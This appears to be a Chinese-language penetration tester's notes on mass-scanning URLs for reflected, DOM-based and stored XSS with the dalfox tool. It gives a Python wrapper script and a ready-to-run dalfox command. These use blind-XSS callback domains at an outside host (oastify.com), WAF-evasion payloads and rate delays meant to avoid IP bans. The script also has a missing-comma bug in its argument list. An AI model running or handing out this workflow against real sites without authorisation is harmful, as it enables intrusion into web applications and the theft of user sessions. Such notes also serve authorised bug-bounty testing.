### 一、批量跑RXSS

缺点：

1. 使用占位符{{.xss}}，指定payload位置，但是这个占位符号又会出现在请求中，它不会去掉，这些字符又可能是敏感字符，本来是可以通过Gxss结果 -> 把反射点改成 -> 占位符就行，然后批量跑txt
2. 可以通过-p指定参数，但是这样就需要额外的脚本，把Gxss的反射点的参数一个个提取出来，然后按照dalfox的一个个进行扫描
3. 默认会开很多种配置：
   1. 参数寻找：不需要因为到这里之前，都是在寻找参数
   2. headless：检测反射，不需要
4. 虽然可以指定UA，但是每一个跑的请求就很多，不能指定，每一个请求都改UA，那就代理BP，使用SwitchUA插件就行！
5. **----skip-discovery如果使用了那么一定要使用-p，因为不skip的意思是，url的所有参数都会跑**
6. --skip-mining-all 才是额外的参数发现
7. --skip-xss-scanning 是不进行xss测试

#### 脚本：

```py
import urllib.parse
import subprocess
import os
import time

# 输入输出文件路径
input_file = "gxss_result.txt"
output_file = "rxss_result.txt"

# 提取 URL 中包含特定值的参数名
def extract_param_name(url):
    parsed_url = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed_url.query)
    for param, values in query_params.items():
        if "wjch611" in values:
            return param
    return None

# 清空主输出文件
open(output_file, "w").close()

# 读取 URL 列表
with open(input_file, "r", encoding='utf-8') as f:
    urls = f.readlines()

# 获取总 URL 数量
total_urls = len(urls)

# 遍历每个 URL 进行处理
for index, url in enumerate(urls):
    url = url.strip()
    if not url:
        continue

    param_name = extract_param_name(url)
    if param_name:
        print(f"Processing URL ({index + 1}/{total_urls}): {url}")
        print(f"Parameter name: {param_name}")

        temp_output = "dalfox_tmp.txt"  # 临时文件路径

        # 构建并执行单个请求的 Dalfox 命令
        dalfox_cmd = [
            "dalfox",
            "url",
            url,
            "-p", param_name,
            "--only-poc", "r",               # 只显示 PoC
            "--proxy", "http://127.0.0.1:8080",  # 使用代理
            "--delay", "100",                 # 延时 10ms
            "-w", "30",                      # 设置并发数
            "--format", "plain",             # 输出格式为 plain
            "--no-color",                    # 禁用彩色输出
            "--skip-headless",               # 禁用 headless 浏览器扫描
            "--skip-mining-all",             # 跳过所有参数挖掘
            "--no-spinner",                  # 禁用进度动画
            "--output", temp_output          # 输出到临时文件
            "-b", "zpsmicqc875ce0yglo76xpkzkqqhe72w.oastify.com"
        ]

        try:
            # 执行 Dalfox 命令，获取进度输出
            result = subprocess.run(
                dalfox_cmd,
                text=True,
                encoding='utf-8',
                stdout=subprocess.PIPE,   # 获取标准输出
                stderr=subprocess.PIPE    # 获取错误输出
            )

            # 显示当前扫描的 URL 和命令执行的详细信息
            print(f"Command executed: {' '.join(dalfox_cmd)}")
            print(f"Dalfox Output: {result.stdout}")

            # 将临时文件内容追加到主输出文件
            if os.path.exists(temp_output):
                with open(temp_output, "r", encoding='utf-8') as temp, open(output_file, "a", encoding='utf-8') as out:
                    out.write(f"URL: {url}\n")
                    out.write(temp.read())
                    out.write("-" * 80 + "\n")
                os.remove(temp_output)

        except Exception as e:
            print(f"Error running dalfox for {url}: {e}")
    else:
        print(f"No injectable parameter found in: {url}")
```

### 二、批量跑DXSS\SXSS

```
dalfox file merged_results.txt --deep-domxss --skip-mining-all --force-headless-verification --proxy "http://127.0.0.1:8080" -w 30 --delay 100 -o "dxss_result.txt" -b "ttqyfntshs42l1m73fsyf6nxgomfa5yu.oastify.com" --waf-evasion
```

- --deep-domxss 只是加强dom，并不会忽略存储的检测

| 参数                                                | 说明                                                         |
| --------------------------------------------------- | ------------------------------------------------------------ |
| `file merged_results.txt`                           | 从文件中读取待测 URL（一般是带参数的 URL 列表）              |
| `--deep-domxss`                                     | 启用深度 DOM XSS 分析（用 headless 浏览器动态加载页面分析 JS sink） |
| `--skip-mining-all`                                 | 不进行参数挖掘（即不自动添加额外参数，只测试 URL 中已有参数） |
| `--force-headless-verification`                     | 使用 headless 浏览器验证反射点是否真实触发 XSS（提升准确率，避免误报） |
| `--proxy "http://127.0.0.1:8080"`                   | 使用本地代理转发流量（可接入 BurpSuite 抓包分析）            |
| `-w 30`                                             | 并发线程数为 30                                              |
| `--delay 100`                                       | 每个请求之间延迟 100 毫秒（减缓请求速率，降低被封 IP 风险）  |
| `-o "dxss_result.txt"`                              | 将结果输出保存到 `dxss_result.txt` 文件中                    |
| `-b "ttqyfntshs42l1m73fsyf6nxgomfa5yu.oastify.com"` | 设置 Blind XSS 的监听地址（如通过 `document.location` 触发时可接收回连） |
| `--waf-evasion`                                     | 尝试使用内置的 WAF 绕过 payload（如编码、混淆、payload 变种） |